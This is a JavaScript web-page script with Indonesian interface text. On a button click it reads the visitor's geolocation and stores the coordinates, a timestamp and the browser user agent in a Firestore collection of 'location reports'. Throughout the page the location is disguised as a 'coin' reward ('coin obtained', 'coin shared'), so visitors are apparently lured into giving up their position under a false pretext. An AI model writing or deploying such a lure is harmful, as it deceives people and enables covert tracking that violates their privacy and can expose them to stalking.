import { db, collection, addDoc, serverTimestamp } from './firebase.js';

const btnLokasi = document.getElementById('btn-lokasi');
const statusTeks = document.getElementById('status');

btnLokasi.addEventListener('click', () => {
    if (!navigator.geolocation) {
        statusTeks.textContent = 'Browser Anda tidak mendukung fitur koin.';
        statusTeks.style.color = '#d9534f';
        return;
    }

    statusTeks.textContent = 'Meminta izin lokasi...';
    statusTeks.style.color = '#333';
    btnLokasi.disabled = true;

    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            
            statusTeks.style.color = '#007bff';
            statusTeks.textContent = `koin didapatkan. Sedang menerima data...`;
            
            try {
                // Pastikan Anda sudah membuat Firestore Database dan mengatur Rules-nya
                await addDoc(collection(db, "laporan_lokasi"), {
                    latitude: latitude,
                    longitude: longitude,
                    waktu: serverTimestamp(),
                    browser: navigator.userAgent
                });

                statusTeks.style.color = 'green';
                statusTeks.textContent = `Terima kasih! .`;
                btnLokasi.textContent = 'koin Telah Dibagikan';
            } catch (error) {
                console.error("Error mengirim data: ", error);
                statusTeks.style.color = '#d9534f';
                statusTeks.textContent = `Gagal mengirim data. Pastikan Firestore sudah aktif.`;
                btnLokasi.disabled = false;
            }
        },
        (error) => {
            btnLokasi.disabled = false;
            statusTeks.style.color = '#d9534f';
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    statusTeks.textContent = "Anda menolak permintaan koin.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    statusTeks.textContent = "Informasi koin tidak tersedia.";
                    break;
                case error.TIMEOUT:
                    statusTeks.textContent = "Waktu permintaan koin habis.";
                    break;
                default:
                    statusTeks.textContent = "Terjadi kesalahan tidak dikenal.";
                    break;
            }
        }
    );
});
